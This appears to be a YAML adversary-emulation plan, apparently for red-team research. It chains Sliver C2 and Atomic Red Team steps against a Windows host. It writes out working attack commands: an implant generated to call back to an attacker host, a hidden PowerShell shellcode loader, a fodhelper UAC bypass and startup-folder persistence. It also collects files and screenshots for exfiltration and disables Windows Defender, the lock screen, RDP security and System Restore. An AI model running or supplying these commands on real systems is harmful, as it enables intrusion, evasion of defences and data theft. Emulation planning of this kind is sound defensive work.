emulation_plan_details:
  adversary_name: '160'
  creation_time: 2025-06-28 05:57:28 UTC+0000
attack_action_sequence:
  - uuid: 2a602f8e-4d1f-49f1-b3b8-4b74f67cb63a
    name: Build Shellcode for the Sliver implant (for Windows)
    id:
      - T1071.001
    source: Manual
    supported_platforms:
      - windows
    tactics:
      - Command and Control
    technique:
      - Application Layer Protocol - Web Protocols
    description: |
      The command is used in the Sliver C2 (Command and Control) framework to generate a shellcode payload designed for remote access to a target machine.
    execution:
      executor: Sliver Console
      command: |
        sliver > generate --mtls #{LHOST}:#{LPORT} --os windows --arch 64bit --format shellcode --save #{SAVE_PATH}
        sliver > mtls --lport #{LPORT}
    arguments:
      LHOST:
        default:
        description: IP address of the attacker machine
        type:
      LPORT:
        default:
        description: listening port of the attacter machine
        type:
      SAVE_PATH:
        default:
        description: Saved path of the generated payload
        type:
    preconditions:
      - (os_windows ?target - host)
      - (unallocated ?p - payload)
      - (unallocated ?file - file)
    effects:
      - (sliver_implant_payload ?p - payload ?target - host)
      - (shellcode_payload ?p - payload)
      - (file_payload ?p - payload ?file - file)
      - (bin_blob_file ?file - file)
      - (file_prepared_local ?file - file)
      - ~(unallocated ?p - payload)
      - ~(unallocated ?file - file)
  - uuid: 7480189e-1a4b-45f5-b225-c102915f7262
    name: Simulate the victim download a file on its machine
    id:
      - T1566.002
    source: Manual
    supported_platforms:
      - windows
    tactics:
      - Initial Access
    technique:
      - 'Phishing: Spearphishing Link'
    description: This step simulates the victim accidentally downloads a malicious
      file by clicking a link.
    execution:
      executor: Human
      command: |
        (This step needs human interaction and (temporarily) cannot be executed automatically)
        (On attacker's machine)
        python -m http.server

        (On victim's machine)
        1. Open #{LHOST}:#{LPORT} in the browser
        2. Navigate to the path of the file on the attacker's machine
        3. Download the file to #{PATH}
    arguments:
      LHOST:
        default:
        description: IP address of the attacker machine
        type:
      LPORT:
        default:
        description: listening port of the attacter machine
        type:
      SAVE_PATH:
        default:
        description: Saved path of the downloaded payload
        type:
    preconditions:
      - (file_prepared_local ?file - file)
    effects:
      - (file_exists ?path - path ?file - file ?t - host)
  - uuid: 0617285b-6005-4a73-83c5-d4dc86fcdc35
    name: Simulate the victim executes a shellcode payload (Windows)
    id:
      - T1059.001
      - T1620
    source: Manual
    supported_platforms:
      - windows
    tactics:
      - Execution
      - Defense Evasion
    technique:
      - 'Command and Scripting Interpreter: PowerShell'
      - Reflective Code Loading
    description:
    execution:
      executor: Human
      command: |
        (This step needs human interaction and (temporarily) cannot be executed automatically)
        (On victim's machine, open a powershell and execute these scripts)

        $s=[System.IO.File]::ReadAllBytes('#{SAVE_PATH}');
        $c='using System;using System.Runtime.InteropServices;public class W{[DllImport("kernel32")]public static extern IntPtr VirtualAlloc(IntPtr a,uint b,uint c,uint d);[DllImport("kernel32")]public static extern IntPtr CreateThread(IntPtr a,uint b,IntPtr c,IntPtr d,uint e,IntPtr f);[DllImport("kernel32")]public static extern uint WaitForSingleObject(IntPtr a,uint b);[DllImport("kernel32.dll")]public static extern IntPtr GetConsoleWindow();[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr hWnd,int nCmdShow);}';Add-Type -TypeDefinition $c;$hwnd=[W]::GetConsoleWindow();if($hwnd -ne [IntPtr]::Zero){[W]::ShowWindow($hwnd,0)};
        $p=[W]::VirtualAlloc(0,$s.Length,0x3000,0x40);
        [System.Runtime.InteropServices.Marshal]::Copy($s,0,$p,$s.Length);
        $h=[W]::CreateThread(0,0,$p,0,0,0);[W]::WaitForSingleObject($h,0xFFFFFFFF)
    arguments:
      SAVE_PATH:
        default:
        description: Saved path of the downloaded shellcode payload file
        type:
    preconditions:
      - (file_exists ?path - path ?file - file ?t - host)
      - (bin_blob_file ?file - file)
    effects:
      - (file_executed ?file - file ?t - host)
  - uuid: 1f401bbe-de24-41d2-8e34-d026e25bfb94
    name: Execute a Sliver Implant Payload
    id:
      - T1071.001
    source: Sliver
    supported_platforms:
      - windows
    tactics:
      - Command and Control
    technique:
      - Application Layer Protocol - Web Protocols
    description: |
      Executing a Sliver implant payload will establish a Sliver session.
    execution:
      executor: None
      command: |
        None
    arguments:
    preconditions:
      - (sliver_implant_payload ?p - payload ?t - host)
      - (file_payload ?p - payload ?f - file)
      - (file_executed ?f - file ?t - host)
      - (unallocated ?s - executor)
    effects:
      - (sliver_session ?s - executor ?t - host)
      - ~(unallocated ?s - executor)
      - operator: When
        params:
          condition: (file_executed_as_root ?f - file ?t - host)
          effect: (elevated_executor ?s - executor)
  - uuid: 7bfba376-cebc-4094-b1e6-5103b2e83c4e
    name: Execute PowerShell Command
    id:
      - T1059.001
    source: Sliver
    supported_platforms:
      - windows
    tactics:
      - Execution
    technique:
      - |
        Command and Scripting Interpreter: PowerShell
    description: The `powershell.exe` command executes a PowerShell script or command
      on the remote host. This command is useful for performing system monitoring
      tasks or gathering information about the processes running on a remote machine.
    execution:
      executor: Sliver Executor
      command: powershell(#{SessionID},#{Commands})
    arguments:
      SessionID:
        description: The session ID of the active Sliver connection.
    preconditions:
      - (os_windows ?t - host)
      - (sliver_session ?s1 - executor ?t - host)
    effects:
      - (powershell ?s2 - executor ?t - host)
      - operator: When
        params:
          condition: (elevated_executor ?s1 - executor)
          effect: (elevated_executor ?s2 - executor)
  - uuid: 1b0814d1-bb24-402d-9615-1b20c50733fb
    name: Network Share Discovery PowerShell
    id:
      - T1135
    source: ART
    supported_platforms:
      - windows
    tactics:
      - Discovery
    technique:
      - Network Share Discovery
    description: |
      Network Share Discovery utilizing PowerShell. The computer name variable may need to be modified to point to a different host
      Upon execution, avalaible network shares will be displayed in the powershell session
    execution:
      executor: Powershell Executor
      command: |
        get-smbshare
    arguments:
    dependencies:
    preconditions:
      - (powershell ?executor - executor ?target - host)
      - (os_windows ?target - host)
    effects:
      - (network_share_info_known ?target - host)
  - uuid: f9c1197c-c5ef-4368-a10c-3a53003dbfbf
    name: Remote Directory Listing
    id:
      - T1083
    source: Sliver
    supported_platforms:
      - windows
      - linux
      - macos
    tactics:
      - Discovery
    technique:
      - File and Directory Discovery
    description: The `ls <remote path>` command lists files and directories in a specified
      remote path or the current directory if no path is provided. By default, it
      sorts listings by name in ascending order, but can also sort by size or modified
      time, with options to reverse the order. The command includes flags for sorting,
      reversing order, and setting a timeout.
    execution:
      executor: Sliver Executor
      command: ls(#{SessionID})
    arguments:
      SessionID:
        default:
        description: The session ID of the active Sliver connection.
        type:
    preconditions:
      - operator: or
        operands:
          - (os_windows ?t - host)
          - (os_linux ?t - host)
          - (os_macos ?t - host)
      - (sliver_session ?s - executor ?t - host)
    effects:
      - (file_info_known ?t - host)
  - uuid: 2a602f8e-4d1f-49f1-b3b8-4b74f67cb63a
    name: Build Shellcode for the Sliver implant (for Windows)
    id:
      - T1071.001
    source: Manual
    supported_platforms:
      - windows
    tactics:
      - Command and Control
    technique:
      - Application Layer Protocol - Web Protocols
    description: |
      The command is used in the Sliver C2 (Command and Control) framework to generate a shellcode payload designed for remote access to a target machine.
    execution:
      executor: Sliver Console
      command: |
        sliver > generate --mtls #{LHOST}:#{LPORT} --os windows --arch 64bit --format shellcode --save #{SAVE_PATH}
        sliver > mtls --lport #{LPORT}
    arguments:
      LHOST:
        default:
        description: IP address of the attacker machine
        type:
      LPORT:
        default:
        description: listening port of the attacter machine
        type:
      SAVE_PATH:
        default:
        description: Saved path of the generated payload
        type:
    preconditions:
      - (os_windows ?target - host)
      - (unallocated ?p - payload)
      - (unallocated ?file - file)
    effects:
      - (sliver_implant_payload ?p - payload ?target - host)
      - (shellcode_payload ?p - payload)
      - (file_payload ?p - payload ?file - file)
      - (bin_blob_file ?file - file)
      - (file_prepared_local ?file - file)
      - ~(unallocated ?p - payload)
      - ~(unallocated ?file - file)
  - uuid: 2074d817-7819-401b-b552-1045672f77f3
    name: Execute Command (cmd.exe)
    id:
      - T1059.003
    source: Sliver
    supported_platforms:
      - windows
    tactics:
      - Execution
    technique:
      - |
        Command and Scripting Interpreter: Windows Command Shell
    description: The `cmd.exe` command executes a Windows command. It runs the specified
      command on the remote host and returns the result. This command is useful for
      performing various system tasks.
    execution:
      executor: Sliver Executor
      command: cmd(#{SessionID},#{Commands})
    arguments:
      SessionID:
        description: The session ID of the active Sliver connection.
    preconditions:
      - (os_windows ?t - host)
      - (sliver_session ?s1 - executor ?t - host)
    effects:
      - (command_prompt ?s2 - executor ?t - host)
      - operator: When
        params:
          condition: (elevated_executor ?s1 - executor)
          effect: (elevated_executor ?s2 - executor)
  - uuid: 6fbc9e68-5ad7-444a-bd11-8bf3136c477e
    name: Enumerate all accounts (Domain)
    id:
      - T1087.002
    source: ART
    supported_platforms:
      - windows
    tactics:
      - Discovery
    technique:
      - 'Account Discovery: Domain Account'
    description: |
      Enumerate all accounts
      Upon exection, multiple enumeration commands will be run and their output displayed in the PowerShell session
    execution:
      executor: Command Prompt Executor
      command: |
        net user /domain
        net group /domain
    arguments:
    dependencies:
    preconditions:
      - (command_prompt ?executor - executor ?target - host)
      - (os_windows ?target - host)
    effects:
      - (user_info_known ?target - host)
  - uuid: 0e67b73a-9927-43e1-8f64-04d38f1db57d
    name: Build the executable file of a Sliver implant (for Windows)
    id:
      - T1071.001
    source: Manual
    supported_platforms:
      - windows
    tactics:
      - Command and Control
    technique:
      - Application Layer Protocol - Web Protocols
    description: |
      The command is used in the Sliver C2 (Command and Control) framework to generate a payload designed for remote access to a target machine.
    execution:
      executor: Sliver Console
      command: |
        sliver > generate --mtls #{LHOST}:#{LPORT} --os windows --arch 64bit --format exe --save #{SAVE_PATH}
        sliver > mtls --lport #{LPORT}
    arguments:
      LHOST:
        default:
        description: IP address of the attacker machine
        type:
      LPORT:
        default:
        description: listening port of the attacter machine
        type:
      SAVE_PATH:
        default:
        description: Saved path of the generated payload
        type:
    preconditions:
      - (os_windows ?target - host)
      - (unallocated ?p - payload)
      - (unallocated ?file - file)
    effects:
      - (sliver_implant_payload ?p - payload ?target - host)
      - (file_payload ?p - payload ?file - file)
      - (file_prepared_local ?file - file)
      - (exe_file ?file - file)
      - ~(unallocated ?p - payload)
      - ~(unallocated ?file - file)
  - uuid: 4a31f8db-89db-4f16-baab-47bb3f9d5b8a
    name: Simulate the victim download and execute malicious payload file
    id:
      - T1204.002
    source: Manual
    supported_platforms:
      - windows
      - linux
    tactics:
      - Execution
    technique:
      - 'User Execution: Malicious File'
    description:
    execution:
      executor: Human
      command: |
        (This step needs human interaction and (temporarily) cannot be executed automatically)
        (On attacker's machine)
        python -m http.server

        (On victim's machine)
        1. Open #{LHOST}:#{LPORT} in the browser
        2. Navigate to the path of the target payload file
        3. Download the payload file
        4. Execute the payload file to #{PATH} (If on a Linux machine, you also need to chmod the file)
    arguments:
      LHOST:
        default:
        description: IP address of the attacker machine
        type:
      LPORT:
        default:
        description: listening port of the attacter machine
        type:
      SAVE_PATH:
        default:
        description: Saved path of the downloaded payload
        type:
    preconditions:
      - (file_prepared_local ?file - file)
      - operator: or
        operands:
          - (exe_file ?file - file)
          - (elf_file ?file - file)
    effects:
      - (file_exists ?path - path ?file - file ?t - host)
      - (file_executed ?file - file ?t - host)
  - uuid: 8834b65a-f808-4ece-ad7e-2acdf647aafa
    name: Change Startup Folder - HKCU Modify User Shell Folders Startup Value
    id:
      - T1547.001
    source: ART
    supported_platforms:
      - windows
    tactics:
      - Persistence
      - Privilege Escalation
    technique:
      - 'Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder'
    description: |
      This test will modify the HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders  -V "Startup" value 
      to point to a new startup folder where a payload could be stored to launch at boot.  *successful execution requires system restart
    execution:
      executor: Powershell Executor
      command: |
        New-Item -ItemType Directory -path "#{new_startup_folder}"
        Copy-Item -path "#{payload}" -destination "#{new_startup_folder}"
        Set-ItemProperty -Path  "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" -Name "Startup" -Value "#{new_startup_folder}"
    arguments:
      new_startup_folder:
        description: new startup folder to replace standard one
        type: string
        default: $env:TMP\atomictest\
      payload:
        description: 'executable to be placed in new startup location '
        type: string
        default: C:\Windows\System32\calc.exe
    dependencies:
    preconditions:
      - (os_windows ?target - host)
      - (powershell ?executor - executor ?target - host)
      - (file_exists ?payload - path ?file - file ?target - host)
      - (exe_file ?file - file)
    effects:
      - (file_execution_at_startup ?file - file ?target - host)
  - uuid: f7f31777-1bbf-4ddc-b7a1-af9f46a5299b
    name: Obtain a persistent Sliver Executor
    id:
      - 
    source: Manual
    supported_platforms:
      - windows
      - linux
      - macos
    tactics:
      - Persistence
    technique:
      - 
    description: |
      Obtain the persistency of Sliver Executor via scheduled payload file execution.
    execution:
      executor: None
      command: |
        None
    arguments:
    preconditions:
      - (sliver_implant_payload ?p - payload ?target - host)
      - (file_payload ?p - payload ?f - file)
      - operator: or
        operands:
          - (file_execution_at_time ?f - file ?target - host)
          - (file_execution_at_startup ?f - file ?target - host)
      - (unallocated ?s - executor)
    effects:
      - (persistent_sliver_session ?s - executor ?target - host)
      - ~(unallocated ?s - executor)
  - uuid: d3d9af44-b8ad-4375-8b0a-4bff4b7e419c
    name: Search files of interest and save them to a single zip file (Windows)
    id:
      - T1005
    source: ART
    supported_platforms:
      - windows
    tactics:
      - Collection
    technique:
      - Data from Local System
    description: |
      This test searches for files of certain extensions and saves them to a single zip file prior to extraction.                              
    execution:
      executor: Powershell Executor
      command: |
        $startingDirectory = "C:"
        $outputZip = "#{output_zip_folder_path}"
        $fileExtensionsString = ".doc, .docx, .txt" 
        $fileExtensions = $fileExtensionsString -split ", "

        New-Item -Type Directory $outputZip -ErrorAction Ignore -Force | Out-Null

        Function Search-Files {
          param (
            [string]$directory
          )
          $files = Get-ChildItem -Path $directory -File -Recurse | Where-Object {
            $fileExtensions -contains $_.Extension.ToLower()
          }
          return $files
        }

        $foundFiles = Search-Files -directory $startingDirectory
        if ($foundFiles.Count -gt 0) {
          $foundFilePaths = $foundFiles.FullName
          Compress-Archive -Path $foundFilePaths -DestinationPath "$outputZip\data.zip"

          Write-Host "Zip file created: $outputZip\data.zip"
          } else {
              Write-Host "No files found with the specified extensions."
          }
    arguments:
      output_zip_folder_path:
        description: Path to directory for saving the generated zip file
        type: Path
        default: PathToAtomicsFolder\..\ExternalPayloads\T1005
    dependencies:
    preconditions:
      - (os_windows ?target - host)
      - (powershell ?executor - executor ?target - host)
    effects:
      - (certain_extension_data_saved ?file - file ?target - host)
      - (file_exists ?output_zip_folder_path - path ?file - file ?target - host)
      - (zip_file ?file - file)
  - uuid: e9313014-985a-48ef-80d9-cde604ffc187
    name: Windows Screen Capture (CopyFromScreen)
    id:
      - T1113
    source: ART
    supported_platforms:
      - windows
    tactics:
      - Collection
    technique:
      - Screen Capture
    description: |
      Take a screen capture of the desktop through a call to the [Graphics.CopyFromScreen] .NET API.

      [Graphics.CopyFromScreen]: https://docs.microsoft.com/en-us/dotnet/api/system.drawing.graphics.copyfromscreen
    execution:
      executor: Powershell Executor
      command: |
        Add-Type -AssemblyName System.Windows.Forms
        $screen = [Windows.Forms.SystemInformation]::VirtualScreen
        $bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height
        $graphic = [Drawing.Graphics]::FromImage($bitmap)
        $graphic.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)
        $bitmap.Save("#{output_file}")
    arguments:
      output_file:
        description: Path where captured results will be placed
        type: path
        default: $env:TEMP\T1113.png
    dependencies:
    preconditions:
      - (os_windows ?target - host)
      - (powershell ?executor - executor ?target - host)
    effects:
      - (screenshot_data_saved ?file - file ?target - host)
      - (file_exists ?output_file - path ?file - file ?target - host)
      - (png_file ?file - file)
  - uuid: 2e8f1a9c-0b5e-4a7c-b6d4-9a8b2d3c5f1e
    name: Create Directory
    id:
      - T1106
    source: Sliver
    supported_platforms:
      - windows
      - linux
    tactics:
      - Persistence
    technique:
      - File System Permissions Modification
    description: The `mkdir` command creates a new directory on the target system.
    execution:
      executor: Sliver Executor
      command: mkdir (#{remote_path},#{SessionID})
    arguments:
      remote_path:
        description: Full path of the directory to create
      SessionID:
        description: The session ID of the active Sliver connection.
    preconditions:
      - operator: or
        operands:
          - (os_windows ?target - host)
          - (os_linux ?target - host)
      - (sliver_session ?executorID - executor ?target - host)
    effects:
      - (dir_exists ?path - path ?dir - dir ?target - host)
  - uuid: a57fbe4b-3440-452a-88a7-943531ac872a
    name: Zip a Folder with PowerShell for Staging in Temp
    id:
      - T1074.001
    source: ART
    supported_platforms:
      - windows
    tactics:
      - Collection
    technique:
      - 'Data Staged: Local Data Staging'
    description: |
      Use living off the land tools to zip a file and stage it in the Windows temporary folder for later exfiltration. Upon execution, Verify that a zipped folder named Folder_to_zip.zip
      was placed in the temp directory.
    execution:
      executor: Powershell Executor
      command: |
        Compress-Archive -Path "#{input_file}" -DestinationPath #{output_file} -Force
    arguments:
      output_file:
        description: Location to save zipped file or folder
        type: path
        default:
      input_file:
        description: Location of file or folder to zip
        type: path
        default:
    dependencies:
    preconditions:
      - (os_windows ?target - host)
      - (powershell ?executor - executor ?target - host)
      - (dir_exists ?input_file - path ?dir - dir ?target - host)
    effects:
      - (dir_data_saved ?dir - dir ?file - file)
      - (file_exists ?output_file - path ?file - file ?target - host)
      - (zip_file ?file - file)
  - uuid: 3c898f62-626c-47d5-aad2-6de873d69153
    name: Windows Screencapture
    id:
      - T1113
    source: ART
    supported_platforms:
      - windows
    tactics:
      - Collection
    technique:
      - Screen Capture
    description: |
      Use Psr.exe binary to collect screenshots of user display. Test will do left mouse click to simulate user behaviour
    execution:
      executor: Powershell Executor
      command: |
        cmd /c start /b psr.exe /start /output #{output_file} /sc 1 /gui 0 /stopevent 12
        Add-Type -MemberDefinition '[DllImport("user32.dll")] public static extern void mouse_event(int flags, int dx, int dy, int cButtons, int info);' -Name U32 -Namespace W;
        [W.U32]::mouse_event(0x02 -bor 0x04 -bor 0x01, 0, 0, 0, 0);
        cmd /c "timeout 5 > NULL && psr.exe /stop"
    arguments:
      output_file:
        description: Output file path
        type: path
        default: c:\temp\T1113_desktop.zip
    dependencies:
    preconditions:
      - (os_windows ?target - host)
      - (powershell ?executor - executor ?target - host)
    effects:
      - (screenshot_data_saved ?file - file ?target - host)
      - (file_exists ?output_file - path ?file - file ?target - host)
  - uuid: b52e0d1e-a1d2-4299-9a38-cb9d2a7c8ce0
    name: Upload to Remote Path
    id:
      - T1105
    source: Sliver
    supported_platforms:
      - windows
      - linux
      - macos
    tactics:
      - Command and Control
    technique:
      - Ingress Tool Transfer
    description: The `upload <remote_path, data, is_ioc>` function writes data to
      the specified path on the remote file system. Parameters include remote_path
      (remote path), data (data to write), and is_ioc (data is an indicator of compromise).
    execution:
      executor: Sliver Executor
      command: |
        upload(#{RemotePath}, #{Data}, #{IsIOC})
    arguments:
      RemotePath:
        description: Remote path
      Data:
        description: Data to write
      IsIOC:
        description: Data is an indicator of compromise
    preconditions:
      - operator: or
        operands:
          - (os_windows ?t - host)
          - (os_linux ?t - host)
          - (os_macos ?t - host)
      - (sliver_session ?s - executor ?t - host)
      - (file_prepared_local ?file - file)
    effects:
      - (file_exists ?path - path ?file - file ?t - host)
  - uuid: 58f641ea-12e3-499a-b684-44dee46bd182
    name: Bypass UAC using Fodhelper
    id:
      - T1548.002
    source: ART
    supported_platforms:
      - windows
    tactics:
      - Defense Evasion
      - Privilege Escalation
    technique:
      - 'Abuse Elevation Control Mechanism: Bypass User Account Control'
    description: |
      Bypasses User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.
      Upon execution, "The operation completed successfully." will be shown twice and command prompt will be opened.
    execution:
      executor: Command Prompt Executor
      command: |
        reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "#{executable_binary}" /f
        reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f
        fodhelper.exe
    arguments:
      executable_binary:
        description: Binary to execute with UAC Bypass
        type: path
        default: C:\Windows\System32\cmd.exe
    dependencies:
    preconditions:
      - (os_windows ?target - host)
      - (powershell ?executor - executor ?target - host)
      - (file_exists ?executable_binary - path ?file - file ?target - host)
      - operator: or
        operands:
          - (exe_file ?file - file)
    effects:
      - (file_executed_as_root ?file - file ?target - host)
  - uuid: 1f401bbe-de24-41d2-8e34-d026e25bfb94
    name: Execute a Sliver Implant Payload
    id:
      - T1071.001
    source: Sliver
    supported_platforms:
      - windows
    tactics:
      - Command and Control
    technique:
      - Application Layer Protocol - Web Protocols
    description: |
      Executing a Sliver implant payload will establish a Sliver session.
    execution:
      executor: None
      command: |
        None
    arguments:
    preconditions:
      - (sliver_implant_payload ?p - payload ?t - host)
      - (file_payload ?p - payload ?f - file)
      - (file_executed ?f - file ?t - host)
      - (unallocated ?s - executor)
    effects:
      - (sliver_session ?s - executor ?t - host)
      - ~(unallocated ?s - executor)
      - operator: When
        params:
          condition: (file_executed_as_root ?f - file ?t - host)
          effect: (elevated_executor ?s - executor)
  - uuid: 1f401bbe-de24-41d2-8e34-d026e25bfb94
    name: Execute a Sliver Implant Payload
    id:
      - T1071.001
    source: Sliver
    supported_platforms:
      - windows
    tactics:
      - Command and Control
    technique:
      - Application Layer Protocol - Web Protocols
    description: |
      Executing a Sliver implant payload will establish a Sliver session.
    execution:
      executor: None
      command: |
        None
    arguments:
    preconditions:
      - (sliver_implant_payload ?p - payload ?t - host)
      - (file_payload ?p - payload ?f - file)
      - (file_executed ?f - file ?t - host)
      - (unallocated ?s - executor)
    effects:
      - (sliver_session ?s - executor ?t - host)
      - ~(unallocated ?s - executor)
      - operator: When
        params:
          condition: (file_executed_as_root ?f - file ?t - host)
          effect: (elevated_executor ?s - executor)
  - uuid: 2074d817-7819-401b-b552-1045672f77f3
    name: Execute Command (cmd.exe)
    id:
      - T1059.003
    source: Sliver
    supported_platforms:
      - windows
    tactics:
      - Execution
    technique:
      - |
        Command and Scripting Interpreter: Windows Command Shell
    description: The `cmd.exe` command executes a Windows command. It runs the specified
      command on the remote host and returns the result. This command is useful for
      performing various system tasks.
    execution:
      executor: Sliver Executor
      command: cmd(#{SessionID},#{Commands})
    arguments:
      SessionID:
        description: The session ID of the active Sliver connection.
    preconditions:
      - (os_windows ?t - host)
      - (sliver_session ?s1 - executor ?t - host)
    effects:
      - (command_prompt ?s2 - executor ?t - host)
      - operator: When
        params:
          condition: (elevated_executor ?s1 - executor)
          effect: (elevated_executor ?s2 - executor)
  - uuid: 3e757ce7-eca0-411a-9583-1c33b8508d52
    name: Windows HideSCANetwork Group Policy Feature
    id:
      - T1112
    source: ART
    supported_platforms:
      - windows
    tactics:
      - Defense Evasion
    technique:
      - Modify Registry
    description: |
      Modify the registry of the currently logged in user using reg.exe via cmd console to remove the networking icon Group Policy. 
      Take note that some Group Policy changes might require a restart to take effect.
      See how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details
    execution:
      executor: Elevated Command Prompt Executor
      command: |
        reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideSCANetwork /t REG_DWORD /d 1 /f
    arguments:
    dependencies:
    preconditions:
      - (command_prompt ?executor - executor ?target - host)
      - (elevated_executor ?executor - executor)
      - (os_windows ?target - host)
    effects:
      - (networking_icon_group_policy_disabled ?target - host)
  - uuid: 3dacb0d2-46ee-4c27-ac1b-f9886bf91a56
    name: Disable Windows Lock Workstation Feature
    id:
      - T1112
    source: ART
    supported_platforms:
      - windows
    tactics:
      - Defense Evasion
    technique:
      - Modify Registry
    description: |
      Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows Lock workstation feature.
      See how ransomware abuses this technique- https://www.bleepingcomputer.com/news/security/in-dev-ransomware-forces-you-do-to-survey-before-unlocking-computer/
    execution:
      executor: Elevated Command Prompt Executor
      command: |
        reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableLockWorkstation /t REG_DWORD /d 1 /f
    arguments:
    dependencies:
    preconditions:
      - (command_prompt ?executor - executor ?target - host)
      - (elevated_executor ?executor - executor)
      - (os_windows ?target - host)
    effects:
      - (lock_workstation_disabled ?target - host)
  - uuid: 1f6743da-6ecc-4a93-b03f-dc357e4b313f
    name: Tamper with Windows Defender Registry - Reg.exe
    id:
      - T1562.001
    source: ART
    supported_platforms:
      - windows
    tactics:
      - Defense Evasion
    technique:
      - 'Impair Defenses: Disable or Modify Tools'
    description: |
      Disable Windows Defender by tampering with windows defender registry using the utility "reg.exe"
    execution:
      executor: Elevated Command Prompt Executor
      command: |
        reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f >NUL 2>nul
        reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d "1" /f >NUL 2>nul
        reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d "1" /f >NUL 2>nul
        reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIntrusionPreventionSystem" /t REG_DWORD /d "1" /f >NUL 2>nul
        reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d "1" /f >NUL 2>nul
        reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d "1" /f >NUL 2>nul
        reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "1" /f >NUL 2>nul
        reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRoutinelyTakingAction" /t REG_DWORD /d "1" /f >NUL 2>nul
        reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d "1" /f >NUL 2>nul
        reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScriptScanning" /t REG_DWORD /d "1" /f >NUL 2>nul
        reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Reporting" /v "DisableEnhancedNotifications" /t REG_DWORD /d "1" /f >NUL 2>nul 
        reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "DisableBlockAtFirstSeen" /t REG_DWORD /d "1" /f >NUL 2>nul
        reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SpynetReporting" /t REG_DWORD /d "0" /f >NUL 2>nul
        reg add "HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine" /v "MpEnablePus" /t REG_DWORD /d "0" /f >NUL 2>nul
        reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\App and Browser protection" /v "DisallowExploitProtectionOverride" /t REG_DWORD /d "0" /f >NUL 2>nul
        reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v "TamperProtection"  /t REG_DWORD /d "0" /f >NUL 2>nul
        reg add "HKLM\software\microsoft\windows defender\spynet" /v "SubmitSamplesConsent" /t REG_DWORD /d "0" /f >NUL 2>nul
        reg add "HKLM\Software\Microsoft\Windows Defender" /v "PUAProtection" /t REG_DWORD /d "0" /f >NUL 2>nul
    arguments:
    dependencies:
    preconditions:
      - (command_prompt ?executor - executor ?target - host)
      - (elevated_executor ?executor - executor)
      - (os_windows ?target - host)
    effects:
      - (windows_defender_disabled ?target - host)
  - uuid: 4b81bcfa-fb0a-45e9-90c2-e3efe5160140
    name: Disable Remote Desktop Security Settings Through Registry
    id:
      - T1112
    source: ART
    supported_platforms:
      - windows
    tactics:
      - Defense Evasion
    technique:
      - Modify Registry
    description: |
      A modification registry to disable RDP security settings. This technique was seen in DarkGate malware as part of its installation
    execution:
      executor: Command Prompt Executor
      command: |
        reg add "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\Terminal Services" /v "DisableSecuritySettings" /t REG_DWORD /d 1 /f
    arguments:
    dependencies:
    preconditions:
      - (command_prompt ?executor - executor ?target - host)
      - (os_windows ?target - host)
    effects:
      - (rdp_security_settings_disabled ?target - host)
  - uuid: 1c68c68d-83a4-4981-974e-8993055fa034
    name: Windows - Disable the SR scheduled task
    id:
      - T1490
    source: ART
    supported_platforms:
      - windows
    tactics:
      - Impact
    technique:
      - Inhibit System Recovery
    description: |
      Use schtasks.exe to disable the System Restore (SR) scheduled task
    execution:
      executor: Elevated Command Prompt Executor
      command: |
        schtasks.exe /Change /TN "\Microsoft\Windows\SystemRestore\SR" /disable
    arguments:
    dependencies:
    preconditions:
      - (command_prompt ?executor - executor ?target - host)
      - (elevated_executor ?executor - executor)
      - (os_windows ?target - host)
    effects:
      - (system_restore_disabled ?target - host)
testbed_requirement:
  host11:
    os: windows
    cve: []
